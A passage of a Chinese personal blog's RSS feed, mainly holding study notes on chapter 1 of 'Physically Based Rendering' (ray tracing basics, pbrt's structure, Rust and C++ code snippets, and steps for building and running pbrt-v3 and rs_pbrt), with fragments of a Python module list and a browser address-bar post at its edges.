&lt;code&gt;heapq&lt;/code&gt;, &lt;code&gt;hmac&lt;/code&gt;, &lt;code&gt;html&lt;/code&gt;, &lt;code&gt;http&lt;/code&gt;, &lt;code&gt;imaplib&lt;/code&gt;, &lt;code&gt;imghdr&lt;/code&gt;, &lt;code&gt;imp&lt;/code&gt;, &lt;code&gt;importlib&lt;/code&gt;, &lt;code&gt;inspect&lt;/code&gt;, &lt;code&gt;io&lt;/code&gt;, &lt;code&gt;ipaddress&lt;/code&gt;, &lt;code&gt;itertools&lt;/code&gt;, &lt;code&gt;json&lt;/code&gt;, &lt;code&gt;keyword&lt;/code&gt;, &lt;code&gt;linecache&lt;/code&gt;, &lt;code&gt;locale&lt;/code&gt;, &lt;code&gt;logging&lt;/code&gt;, &lt;code&gt;lzma&lt;/code&gt;, &lt;code&gt;mailbox&lt;/code&gt;, &lt;code&gt;mailcap&lt;/code&gt;, &lt;code&gt;marshal&lt;/code&gt;, &lt;code&gt;math&lt;/code&gt;, &lt;code&gt;mimetypes&lt;/code&gt;, &lt;code&gt;mmap&lt;/code&gt;, &lt;code&gt;modulefinder&lt;/code&gt;, &lt;code&gt;msilib&lt;/code&gt;, &lt;code&gt;msvcrt&lt;/code&gt;, &lt;code&gt;multiprocessing&lt;/code&gt;, &lt;code&gt;netrc&lt;/code&gt;, &lt;code&gt;nntplib&lt;/code&gt;, &lt;code&gt;numbers&lt;/code&gt;, &lt;code&gt;operator&lt;/code&gt;, &lt;code&gt;optparse&lt;/code&gt;, &lt;code&gt;os&lt;/code&gt;, &lt;code&gt;pathlib&lt;/code&gt;, &lt;code&gt;pdb&lt;/code&gt;, &lt;code&gt;pickle&lt;/code&gt;, &lt;code&gt;pickletools&lt;/code&gt;, &lt;code&gt;pipes&lt;/code&gt;, &lt;code&gt;pkgutil&lt;/code&gt;, &lt;code&gt;platform&lt;/code&gt;, &lt;code&gt;plistlib&lt;/code&gt;, &lt;code&gt;poplib&lt;/code&gt;, &lt;code&gt;pprint&lt;/code&gt;, &lt;code&gt;profile&lt;/code&gt;, &lt;code&gt;py_compile&lt;/code&gt;, &lt;code&gt;pyclbr&lt;/code&gt;, &lt;code&gt;pydoc&lt;/code&gt;, &lt;code&gt;pyexpat&lt;/code&gt;, &lt;code&gt;queue&lt;/code&gt;, &lt;code&gt;quopri&lt;/code&gt;, &lt;code&gt;random&lt;/code&gt;, &lt;code&gt;re&lt;/code&gt;, &lt;code&gt;reprlib&lt;/code&gt;, &lt;code&gt;rlcompleter&lt;/code&gt;, &lt;code&gt;runpy&lt;/code&gt;, &lt;code&gt;sched&lt;/code&gt;, &lt;code&gt;secrets&lt;/code&gt;, &lt;code&gt;select&lt;/code&gt;, &lt;code&gt;selectors&lt;/code&gt;, &lt;code&gt;shelve&lt;/code&gt;, &lt;code&gt;shlex&lt;/code&gt;, &lt;code&gt;shutil&lt;/code&gt;, &lt;code&gt;signal&lt;/code&gt;, &lt;code&gt;site&lt;/code&gt;, &lt;code&gt;smtplib&lt;/code&gt;, &lt;code&gt;sndhdr&lt;/code&gt;, &lt;code&gt;socket&lt;/code&gt;, &lt;code&gt;socketserver&lt;/code&gt;, &lt;code&gt;sqlite3&lt;/code&gt;, &lt;code&gt;ssl&lt;/code&gt;, &lt;code&gt;stat&lt;/code&gt;, &lt;code&gt;statistics&lt;/code&gt;, &lt;code&gt;string&lt;/code&gt;, &lt;code&gt;stringprep&lt;/code&gt;, &lt;code&gt;struct&lt;/code&gt;, &lt;code&gt;subprocess&lt;/code&gt;, &lt;code&gt;sunau&lt;/code&gt;, &lt;code&gt;symtable&lt;/code&gt;, &lt;code&gt;sys&lt;/code&gt;, &lt;code&gt;sysconfig&lt;/code&gt;, &lt;code&gt;tabnanny&lt;/code&gt;, &lt;code&gt;tarfile&lt;/code&gt;, &lt;code&gt;telnetlib&lt;/code&gt;, &lt;code&gt;tempfile&lt;/code&gt;, &lt;code&gt;test&lt;/code&gt;, &lt;code&gt;textwrap&lt;/code&gt;, &lt;code&gt;threading&lt;/code&gt;, &lt;code&gt;time&lt;/code&gt;, &lt;code&gt;timeit&lt;/code&gt;, &lt;code&gt;tkinter&lt;/code&gt;, &lt;code&gt;token&lt;/code&gt;, &lt;code&gt;tokenize&lt;/code&gt;, &lt;code&gt;tomllib&lt;/code&gt;, &lt;code&gt;trace&lt;/code&gt;, &lt;code&gt;traceback&lt;/code&gt;, &lt;code&gt;tracemalloc&lt;/code&gt;, &lt;code&gt;turtle&lt;/code&gt;, &lt;code&gt;types&lt;/code&gt;, &lt;code&gt;typing&lt;/code&gt;, &lt;code&gt;unicodedata&lt;/code&gt;, &lt;code&gt;unittest&lt;/code&gt;, &lt;code&gt;urllib&lt;/code&gt;, &lt;code&gt;uu&lt;/code&gt;, &lt;code&gt;uuid&lt;/code&gt;, &lt;code&gt;venv&lt;/code&gt;, &lt;code&gt;warnings&lt;/code&gt;, &lt;code&gt;wave&lt;/code&gt;, &lt;code&gt;weakref&lt;/code&gt;, &lt;code&gt;webbrowser&lt;/code&gt;, &lt;code&gt;winreg&lt;/code&gt;, &lt;code&gt;winsound&lt;/code&gt;, &lt;code&gt;wsgiref&lt;/code&gt;, &lt;code&gt;xdrlib&lt;/code&gt;, &lt;code&gt;xml&lt;/code&gt;, &lt;code&gt;xmlrpc&lt;/code&gt;, &lt;code&gt;zipapp&lt;/code&gt;, &lt;code&gt;zipfile&lt;/code&gt;, &lt;code&gt;zipimport&lt;/code&gt;, &lt;code&gt;zlib&lt;/code&gt;, &lt;code&gt;zoneinfo&lt;/code&gt; 🐍&lt;/p&gt;
</content:encoded></item><item><title>PBRT 笔记：1. 绪论</title><link>https://blog.xinshijiededa.men/pbrt-introduction/</link><guid isPermaLink="true">https://blog.xinshijiededa.men/pbrt-introduction/</guid><pubDate>Sun, 15 Jan 2023 03:33:40 GMT</pubDate><content:encoded>&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/20166026/212490756-206ba1cd-4ef7-4a25-90fe-502279a37ddf.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;本文为《基于物理的渲染：从理论到实现》第三版第一章的笔记．此书通过结合具体的软件（pbrt）代码，讲解光线追踪的实现．&lt;/p&gt;
&lt;h1&gt;相关资源&lt;/h1&gt;
&lt;p&gt;本书的 &lt;a href=&quot;https://www.pbrt.org/&quot;&gt;官方网站&lt;/a&gt;．你可以在 &lt;a href=&quot;https://www.pbr-book.org/&quot;&gt;这里&lt;/a&gt; 免费阅读第三版（英文），或者在 &lt;a href=&quot;https://github.com/kanition/pbrtbook&quot;&gt;这里&lt;/a&gt; 免费下载第三版（中文）的 PDF（目前翻译进度到第八章）．你也可以购买清华大学出版社翻译的《物理渲染：从理论到实现（第二版）》纸质书（ISBN &lt;code&gt;9787302449812&lt;/code&gt;），不过价格不菲．&lt;/p&gt;
&lt;p&gt;&lt;code&gt;pbrt-v3&lt;/code&gt; 是原书作者的 C++ 实现，代码在 &lt;a href=&quot;https://github.com/mmp/pbrt-v3&quot;&gt;GitHub&lt;/a&gt;．&lt;/p&gt;
&lt;p&gt;&lt;code&gt;rs_pbrt&lt;/code&gt; 是一个 Rust 的 pbrt-v3 实现，不过目前还有多处待完成，缺少一些功能．不过 Rust 有统一的构建环境和更好的开发体验．你可以看看其 &lt;a href=&quot;https://github.com/wahn/rs_pbrt&quot;&gt;GitHub 仓库&lt;/a&gt; 和 &lt;a href=&quot;https://www.rs-pbrt.org/&quot;&gt;网站&lt;/a&gt;．&lt;/p&gt;
&lt;p&gt;本文末尾附有简明的编译和使用教程．&lt;/p&gt;
&lt;h1&gt;第一章：绪论&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;渲染&lt;/strong&gt;（rendering）是由 3D &lt;strong&gt;场景&lt;/strong&gt;（scene）描述生成图像的过程．&lt;strong&gt;基于物理的&lt;/strong&gt;（physically based）渲染运用物理学规律对光与物质的相互作用建模．&lt;/p&gt;
&lt;p&gt;长期以来，&lt;strong&gt;实时&lt;/strong&gt;（real-time）渲染主要采用&lt;strong&gt;栅格化&lt;/strong&gt;（rasterization）或栅格化+&lt;strong&gt;光线追踪&lt;/strong&gt;（ray-tracing），而本书中完全采用光线追踪．&lt;/p&gt;
&lt;h2&gt;1.1 文学编程&lt;/h2&gt;
&lt;p&gt;讲解书中伪代码的表示方法&lt;strong&gt;文学编程&lt;/strong&gt;（literate programming）．&lt;/p&gt;
&lt;p&gt;不认可这种表示方法，即便想法很好——作为教学用的代码不能过长，但是这样代码支离破碎．为了便于理解，应该提供更小更快、能即时查看到效果的教科书．官方的电子版很好，可以展开折叠的代码，而不是在页内跳来跳去．&lt;/p&gt;
&lt;p&gt;Jupyter Notebook 应是一个更好的 literate programming．&lt;/p&gt;
&lt;h2&gt;1.2 逼真渲染和光线追踪算法&lt;/h2&gt;
&lt;h3&gt;1.2.1 相机&lt;/h3&gt;
&lt;p&gt;针孔相机也可以看作是把胶片平面放置在针孔的前方但距离不变——出于仿真目的，可以将胶片放在&lt;strong&gt;视见体&lt;/strong&gt;（viewing volume）位置．视见体、小孔、胶片构成一个双锥体．&lt;/p&gt;
&lt;p&gt;incident light 是「入射光」的意思．&lt;/p&gt;
&lt;h3&gt;1.2.2 光线-物体相交&lt;/h3&gt;
&lt;h4&gt;交点信息&lt;/h4&gt;
&lt;p&gt;将射线 $\boldsymbol{r}$ 写成参数形式：&lt;/p&gt;
&lt;p&gt;$${\boldsymbol r}(t)={\boldsymbol o}+t{\boldsymbol d},$$&lt;/p&gt;
&lt;p&gt;其中 ${\boldsymbol o}$ 是射线端点， ${\boldsymbol d}$ 是其方向向量， $t$ 是定义在 $(0,\infty)$ 的参数．&lt;/p&gt;
&lt;p&gt;由隐函数 $F(x,y,z)=0$ 定义曲面．将曲面的隐式方程代入射线方程即可求得交点．如果没有正根，则射线与球面错开了；如果有，则最小正根给出了交点．&lt;/p&gt;
&lt;h4&gt;该点的特定属性&lt;/h4&gt;
&lt;p&gt;除交点外，光线追踪器还需知道如曲面法线 $\boldsymbol n$ 等额外信息以&lt;strong&gt;着色&lt;/strong&gt;（shade）．&lt;/p&gt;
&lt;h4&gt;加速结构&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;加速结构&lt;/strong&gt;（acceleration structure）可使时间复杂度降为 $O(I\log N)$ ，其中 $I$ 是图像像素数目， $N$ 是场景中物体的数量．&lt;/p&gt;
&lt;h3&gt;1.2.3 光的分布&lt;/h3&gt;
&lt;p&gt;围绕光源的单位球面在单位面积上的功率为 $\displaystyle\frac{\varPhi}{4\mathrm{\pi}}$ ．&lt;/p&gt;
&lt;p&gt;到达半径为 $r$ 的球面上一点的单位面积功率 $\propto\dfrac{1}{r^2}$ ．&lt;/p&gt;
&lt;p&gt;光源若与法线有夹角， $\mathrm dA$ 上积累的功率 $\propto\cos\theta$ ．&lt;/p&gt;
&lt;p&gt;综上所述，单位面积上的&lt;strong&gt;辐射照度&lt;/strong&gt;（differential irradiance） $\mathrm{d}E$ 为&lt;/p&gt;
&lt;p&gt;$$\mathrm{d}E=\frac{\varPhi\cos\theta}{4\mathrm{\pi}r^2}.$$&lt;/p&gt;
&lt;h3&gt;1.2.4 可见性&lt;/h3&gt;
&lt;p&gt;若有阴影遮挡着色点，光源路径不畅通时不会照亮该点．通过 &lt;strong&gt;阴影射线&lt;/strong&gt;（shadow ray）可判断是否可见．方法是 简单构造一条新射线，其端点是表面上的点，方向指向光源，如下图中虚线所示．&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/20166026/212490274-ddae7a7e-2e5c-4088-b337-cff00ea9808d.svg&quot; alt=&quot;递归式的光线追踪&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;图片来源为 闫令琪．&lt;strong&gt;&lt;a href=&quot;https://sites.cs.ucsb.edu/~lingqi/teaching/games101.html&quot;&gt;GAMES101: 现代计算机图形学入门&lt;/a&gt;&lt;/strong&gt;．Lecture 13 &lt;a href=&quot;https://sites.cs.ucsb.edu/~lingqi/teaching/resources/GAMES101_Lecture_13.pdf&quot;&gt;光线追踪（基本原理）[pdf]&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;1.2.5 表面散射&lt;/h3&gt;
&lt;p&gt;为着色我们还需确定入射光如何&lt;strong&gt;被散射&lt;/strong&gt;（scattered）．物体的材质由&lt;strong&gt;双向反射分布函数&lt;/strong&gt;（bidirectional reflectance distribution function，&lt;strong&gt;BRDF&lt;/strong&gt;）描述．该函数告诉我们从&lt;strong&gt;入射&lt;/strong&gt;（incoming）方向 ${\boldsymbol \omega}&lt;em&gt;\mathrm{i}$ 到&lt;strong&gt;出射&lt;/strong&gt;（outgoing）方向 ${\boldsymbol \omega}&lt;/em&gt;\mathrm o$ 会反射多少能量．&lt;/p&gt;
&lt;p&gt;我们把 $\boldsymbol p$ 处的 BRDF 写作 $f_{\mathrm{r}}({\boldsymbol p},{\boldsymbol \omega}&lt;em&gt;\mathrm{o},{\boldsymbol \omega}&lt;/em&gt;\mathrm{i})$ ．&lt;/p&gt;
&lt;h3&gt;1.2.6 间接光传输&lt;/h3&gt;
&lt;p&gt;从物体上一点到达相机的光量由物体的发光量（如果它自己就是光源）与反射光量之和决定．它被形式化为&lt;strong&gt;光传输方程&lt;/strong&gt;（light transport equation），表示从点 $\boldsymbol p$ 沿方向 ${\boldsymbol \omega}&lt;em&gt;\mathrm{o}$ 的出射辐亮度 $L&lt;/em&gt;{\mathrm{o}}({\boldsymbol p},{\boldsymbol \omega}&lt;em&gt;\mathrm{o})$ 等于该点沿该方向的发光亮度加上点 $\boldsymbol p$ 的邻域球面 $S^2$ 所有方向上经 BSDF $f({\boldsymbol p},{\boldsymbol \omega}&lt;/em&gt;\mathrm{o},{\boldsymbol \omega}_\mathrm{i})$ 和余弦项调制的入射亮度：&lt;/p&gt;
&lt;p&gt;$$L_{\mathrm o}({\boldsymbol p},{\boldsymbol \omega}&lt;em&gt;\mathrm{o})=L&lt;/em&gt;{\mathrm e}({\boldsymbol p},{\boldsymbol \omega}&lt;em&gt;\mathrm{o})+\int&lt;/em&gt;{S^2}f({\boldsymbol p},{\boldsymbol \omega}&lt;em&gt;\mathrm{o},{\boldsymbol \omega}&lt;/em&gt;\mathrm{i})L_{\mathrm i}({\boldsymbol p},{\boldsymbol \omega}&lt;em&gt;\mathrm{i})|\cos{\theta&lt;/em&gt;{\mathrm i} }| ,\mathrm{d}{\boldsymbol \omega}_\mathrm{i}$$&lt;/p&gt;
&lt;p&gt;Whitted 算法把积分变为少量方向上的求和，故可以扩展到实现镜面和玻璃外的更多效果．&lt;/p&gt;
&lt;h3&gt;1.2.7 光线传播&lt;/h3&gt;
&lt;p&gt;在非真空中存在如烟、雾、尘等&lt;strong&gt;介质&lt;/strong&gt;（participating media）．&lt;/p&gt;
&lt;h4&gt;熄灭（衰减）&lt;/h4&gt;
&lt;p&gt;介质可以通过吸收或沿不同方向散射来&lt;strong&gt;熄灭&lt;/strong&gt;（extinguish）aka. &lt;strong&gt;衰减&lt;/strong&gt;（attenuate）光．&lt;/p&gt;
&lt;p&gt;需要计算射线与交点之间的&lt;strong&gt;透射率&lt;/strong&gt;（transmittance） $T$ ．&lt;/p&gt;
&lt;h4&gt;增强&lt;/h4&gt;
&lt;p&gt;介质也可以沿路线增强光．在介质发光（例如火焰）或从其他方向把光散射回该射线时可发生该现象．&lt;/p&gt;
&lt;p&gt;可以通过数值计算&lt;strong&gt;体积光传输方程&lt;/strong&gt;（volume light transport equation）来寻求该量，该方法还能计算光传输方程求得从表面反射回的光量．&lt;/p&gt;
&lt;h2&gt;1.3 pbrt：系统概述&lt;/h2&gt;
&lt;h3&gt;1.3.1 执行阶段&lt;/h3&gt;
&lt;p&gt;pbrt 在概念上可分为两个执行阶段．&lt;/p&gt;
&lt;p&gt;首先解析场景描述文件， 最终结果 是 &lt;code&gt;Scene&lt;/code&gt; 和 &lt;code&gt;Integrator&lt;/code&gt; 的实例，后者实现了渲染前者的算法，被称为积分器主要是计算 1.2.6 节中式的积分．&lt;/p&gt;
&lt;p&gt;然后执行渲染主循环，由 &lt;code&gt;Integrator::Render()&lt;/code&gt; 执行．&lt;/p&gt;
&lt;h3&gt;1.3.2 场景表示&lt;/h3&gt;
&lt;p&gt;程序首先解析命令行参数并 parse 场景描述文件，&lt;code&gt;rs_pbrt&lt;/code&gt; 的这部分代码在 &lt;code&gt;rs_pbrt&lt;/code&gt; 的 &lt;code&gt;parse_file&lt;/code&gt; 中．然后 就创建表示场景中光源和几何图元的对象．这两者都储存在 &lt;code&gt;Scene&lt;/code&gt; 对象中．&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-rust&quot;&gt;pub struct Scene {
    pub lights: Vec&amp;lt;Arc&amp;lt;Light&amp;gt;&amp;gt;,
    pub infinite_lights: Vec&amp;lt;Arc&amp;lt;Light&amp;gt;&amp;gt;,
    pub aggregate: Arc&amp;lt;Primitive&amp;gt;,
    pub world_bound: Bounds3f,
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;C++ 的 &lt;code&gt;shared_ptr&lt;/code&gt; 对应的就是 &lt;code&gt;Arc&lt;/code&gt;：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;A thread-safe reference-counting pointer. &apos;Arc&apos; stands for &apos;Atomically Reference Counted&apos;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4&gt;光源&lt;/h4&gt;
&lt;p&gt;场景中每个光源都由Light对象表示，指定灯光的形状和发射能量的分布．&lt;/p&gt;
&lt;h4&gt;几何对象&lt;/h4&gt;
&lt;p&gt;场景中每个几何对象都由Primitive表示，由几何结构 &lt;code&gt;Shape&lt;/code&gt; 和外观描述 &lt;code&gt;Material&lt;/code&gt; 组成．他们都储存在 Primitive 中：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-rust&quot;&gt;pub enum Primitive {
    Geometric(Box&amp;lt;GeometricPrimitive&amp;gt;),
    Transformed(Box&amp;lt;TransformedPrimitive&amp;gt;),
    BVH(Box&amp;lt;BVHAccel&amp;gt;),
    KdTree(Box&amp;lt;KdTreeAccel&amp;gt;),
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这个聚合体是一种特殊的图元，它自己持有许多对其他图元的引用．聚合体的实现用加速的数据结构存储了所有场景图元，减少对远离给定光线的图元做不必要的光线相交测试量．&lt;/p&gt;
&lt;h3&gt;1.3.3 积分器接口与采样积分器&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;积分器&lt;/strong&gt;（integrator）用于计算场景照明的一组测量值．&lt;code&gt;Integrator&lt;/code&gt; 提供 &lt;code&gt;render()&lt;/code&gt; 方法，接收一个 &lt;code&gt;&amp;amp;Scene&lt;/code&gt;．其中一种实现是&lt;code&gt;SamplerIntegrator&lt;/code&gt;，它是由来自 &lt;code&gt;Sampler&lt;/code&gt; 的&lt;strong&gt;样本&lt;/strong&gt;（sample）流驱动的，每个样本标识了图像上的一点，用于计算到达该点以构成图像的光量．&lt;/p&gt;
&lt;p&gt;采样器的实现会极大影响系统生成图像的质量．它责选取光线要追踪的图像平面上的点，并且提供 1.2.6 节公式中所需的采样位置．&lt;/p&gt;
&lt;h3&gt;1.3.4 主渲染循环&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/20166026/212491991-3ba3c837-aa92-41b7-b941-69e49cd64865.svg&quot; alt=&quot;流程示意图&quot;&gt;&lt;/p&gt;
&lt;p&gt;为了并行化，图像会被分成图块，每个图块可并行独立处理．pbrt 固定使用 $16 \times 16$ 的图块，这个&lt;strong&gt;粒度&lt;/strong&gt;（granularity）对绝大多数图像都适用．&lt;/p&gt;
&lt;p&gt;(C++) &lt;code&gt;Li()&lt;/code&gt; 需要为每次辐亮度计算临时分配少量内存，所以我们会用一个 &lt;code&gt;MemoryArena&lt;/code&gt; 实例管理内存池以启用比标准库例程更高性能的分配．&lt;/p&gt;
&lt;h3&gt;1.3.5 Whitted 光线追踪积分器&lt;/h3&gt;
&lt;p&gt;Whitted 积分器工作时递归地计算沿反射和折射光线方向的辐亮度．还是刚才这张图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/20166026/212490274-ddae7a7e-2e5c-4088-b337-cff00ea9808d.svg&quot; alt=&quot;递归式的光线追踪&quot;&gt;&lt;/p&gt;
&lt;p&gt;对于每个光源，积分器调用方法 &lt;code&gt;Light::sample_li()&lt;/code&gt;计算从该光源落到表面上待着色点的辐亮度．&lt;/p&gt;
&lt;h2&gt;1.4 pbrt 的并行化&lt;/h2&gt;
&lt;p&gt;当执行多线程访问共享可改数据时它们必须以某种方式 &lt;strong&gt;同步&lt;/strong&gt;（synchronize）其访问，即为&lt;strong&gt;互斥&lt;/strong&gt;（mutual exclusion）和&lt;strong&gt;原子操作&lt;/strong&gt;（atomic operation）．&lt;/p&gt;
&lt;h3&gt;互斥&lt;/h3&gt;
&lt;p&gt;pbrt 采用 &lt;code&gt;std::mutex&lt;/code&gt; 对象实现互斥．至于 C++ 中使用 mutex 的方法，需要声明一个值和一个 mutex，修改值时创建一个 &lt;code&gt;std::lock_guard&amp;lt;std::mutex&amp;gt;&lt;/code&gt;，该锁会在 drop 时自动释放．cppreference.com &lt;a href=&quot;https://en.cppreference.com/w/cpp/thread/lock_guard#Example&quot;&gt;给出了&lt;/a&gt; 简明的例子，我将其贴在下方：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-cpp&quot;&gt;#include &amp;lt;thread&amp;gt;
#include &amp;lt;mutex&amp;gt;
#include &amp;lt;iostream&amp;gt;

int g_i = 0;
std::mutex g_i_mutex;  // protects g_i

void safe_increment()
{
    const std::lock_guard&amp;lt;std::mutex&amp;gt; lock(g_i_mutex);
    ++g_i;
    std::cout &amp;lt;&amp;lt; &amp;quot;g_i: &amp;quot; &amp;lt;&amp;lt; g_i &amp;lt;&amp;lt; &amp;quot;; in thread #&amp;quot;
              &amp;lt;&amp;lt; std::this_thread::get_id() &amp;lt;&amp;lt; &apos;\n&apos;;
    // g_i_mutex is automatically released when lock
    // goes out of scope
}

int main()
{
    std::cout &amp;lt;&amp;lt; &amp;quot;g_i: &amp;quot; &amp;lt;&amp;lt; g_i &amp;lt;&amp;lt; &amp;quot;; in main()\n&amp;quot;;

    std::thread t1(safe_increment);
    std::thread t2(safe_increment);

    t1.join();
    t2.join();

    std::cout &amp;lt;&amp;lt; &amp;quot;g_i: &amp;quot; &amp;lt;&amp;lt; g_i &amp;lt;&amp;lt; &amp;quot;; in main()\n&amp;quot;;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;原子操作&lt;/h3&gt;
&lt;p&gt;C++ 中使用 &lt;code&gt;std::atomic&lt;/code&gt; 完成原子操作．简单的例子如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-cpp&quot;&gt;std::atomic&amp;lt;int&amp;gt; x(0);
++x;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;1.5 如何继续阅读本书&lt;/h2&gt;
&lt;p&gt;前面的铺垫也太长了，还是过于详细了……&lt;/p&gt;
&lt;h2&gt;1.6 使用和理解代码&lt;/h2&gt;
&lt;p&gt;传递 &lt;code&gt;mullptr&lt;/code&gt; 来表示参数不可用或不该用，此时总是使用指针．&lt;/p&gt;
&lt;p&gt;在当下 CPU 架构上最慢的数运算是除法、平方根和三角函数．&lt;/p&gt;
&lt;h2&gt;1.7 基于物理的渲染简史&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;基于物理的蒙特卡罗渲染方法成功用于制作的一大原因是它们最终提高了艺术家们的生产力．通过调整采样次数来快速获取缩略图；采用能量未必守恒的反射模型时反射参数可能需要在每个光照环境下都要调整； 光线追踪计算的阴影质量比栅格化方法好得多．&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;1.8 扩展阅读&lt;/h2&gt;
&lt;p&gt;无重要内容．&lt;/p&gt;
&lt;h1&gt;编译和运行&lt;/h1&gt;
&lt;p&gt;书中为 &lt;code&gt;pbrt-v3&lt;/code&gt; 提供的场景文件在此 &lt;a href=&quot;https://pub-49ca6a23a58a46ef9cf5a5b34413a7ba.r2.dev/pbrt-v3-scenes.tar.gz&quot;&gt;3.7 GB tar.gz 文件&lt;/a&gt; 中．&lt;code&gt;images&lt;/code&gt; 里有渲染好的图像．&lt;/p&gt;
&lt;h3&gt;在 Windows 上安装和使用 C++ &lt;code&gt;pbrt-v3&lt;/code&gt;&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;scoop install cmake
git clone --recursive &amp;quot;https://github.com/mmp/pbrt-v3/&amp;quot; --depth=1
cd pbrt-v3
mkdir build
cd build
cmake ..
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;若成功，则会有一 &lt;code&gt;.sln&lt;/code&gt; 文件。用 Visual Studio 打开，构建 &lt;code&gt;BUILD_ALL&lt;/code&gt;。若编译成功，则会提示&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;30&amp;gt;spectrum.cpp
30&amp;gt;正在生成代码...
30&amp;gt;pbrt_test.vcxproj -&amp;gt; …\pbrt-v3\build\Release\pbrt_test.exe
30&amp;gt;已完成生成项目“pbrt_test.vcxproj”的操作．
34&amp;gt;------ 已启动生成: 项目: ALL_BUILD, 配置: Release x64 ------
34&amp;gt;Building Custom Rule …/pbrt-v3/CMakeLists.txt
========== “生成”: 34 成功，0 失败，0 更新，0 已跳过 ==========
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以在 &lt;code&gt;build&lt;/code&gt; 目录下的 &lt;code&gt;Release&lt;/code&gt;（或 &lt;code&gt;Debug&lt;/code&gt;）文件夹中找到 &lt;code&gt;pbrt.exe&lt;/code&gt;．&lt;/p&gt;
&lt;h3&gt;使用 &lt;code&gt;rs_pbrt&lt;/code&gt; 渲染文件&lt;/h3&gt;
&lt;p&gt;我先 &lt;code&gt;cargo build -r &lt;/code&gt; 进行 release build，然后通过&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;E:\code\rs_pbrt\target\release\rs_pbrt.exe &amp;quot;E:\downloads\pbrt-v3-scenes\killeroos\killeroo-simple.pbrt&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;绝对路径使用会报错．其原因是 &lt;code&gt;.pbrt&lt;/code&gt; 文件中有 &lt;code&gt;Include&lt;/code&gt; 语句，在 &lt;code&gt;Include &amp;quot;geometry/killeroo.pbrt&amp;quot;&lt;/code&gt; 时遇到相对路径，拼接的 parent 目录为 &lt;code&gt;env::current_dir()&lt;/code&gt;．&lt;code&gt;cd&lt;/code&gt; 到 &lt;code&gt;pbrt-v3-scenes/killeroos/&lt;/code&gt;，参数填写绝对路径依然会有路径拼接错误．解决方法是填写相对路径．&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;❯ E:\downloads\pbrt-v3-scenes\killeroos&amp;gt; E:\code\rs_pbrt\target\release\rs_pbrt.exe &amp;quot;killeroo-simple.pbrt&amp;quot;
pbrt version 0.9.8 (unknown) [Detected 24 cores]
Copyright (c) 2016-2022 Jan Douglas Bert Walter.
Rust code based on C++ code by Matt Pharr, Greg Humphreys, and Wenzel Jakob.
opening file FILE = killeroo-simple.pbrt
Film &amp;quot;image&amp;quot;
&amp;quot;string filename&amp;quot; [&amp;quot;killeroo-simple.exr&amp;quot;]
&amp;quot;integer xresolution&amp;quot; [700]
&amp;quot;integer yresolution&amp;quot; [700]
Sampler &amp;quot;sobol&amp;quot;
&amp;quot;integer pixelsamples&amp;quot; [64]
Integrator &amp;quot;directlighting&amp;quot;
Include &amp;quot;E:\\downloads\\pbrt-v3-scenes\\killeroos\\geometry/killeroo.pbrt&amp;quot;
opening file FILE = E:\downloads\pbrt-v3-scenes\killeroos\geometry/killeroo.pbrt
Include &amp;quot;E:\\downloads\\pbrt-v3-scenes\\killeroos\\geometry/killeroo.pbrt&amp;quot;
opening file FILE = E:\downloads\pbrt-v3-scenes\killeroos\geometry/killeroo.pbrt
Integrator &amp;quot;directlighting&amp;quot;
Rendering with 24 thread(s) ...
1936 / 1936 [======================================================================================================================================] 100.00 % 14.81/s
Writing image &amp;quot;pbrt.png&amp;quot; with bounds Bounds2i { p_min: Point2i { x: 0, y: 0 }, p_max: Point2i { x: 700, y: 700 } } 26.76 % 36.11/s 39s
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;渲染的图片在当前工作目录下．&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/20166026/211073342-7fc95879-c72a-470a-ba17-b666a3e687c9.png&quot; alt=&quot;渲染图 pbrt.png&quot;&gt;&lt;/p&gt;
</content:encoded></item><item><title>我的浏览器地址栏中的 A – Z（2022）</title><link>https://blog.xinshijiededa.men/browser-address-bar-2022/</link><guid isPermaLink="true">https://blog.xinshijiededa.men/browser-address-bar-2022/</guid><pubDate>Fri, 13 Jan 2023 15:24:41 GMT</pubDate><content:encoded>&lt;p&gt;数据截止到 2022 年 12 月 3 日，原记载于 Logseq。写这个是由 &lt;a href=&quot;https://orzfly.com/html/my-browser-address-bar-2021.html&quot;&gt;此文章&lt;/a&gt; 启发。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;A&lt;/strong&gt;rchive.ph&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;B&lt;/strong&gt;aidu.com&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;C&lt;/strong&gt;alendar.google.com&lt;/li&gt;
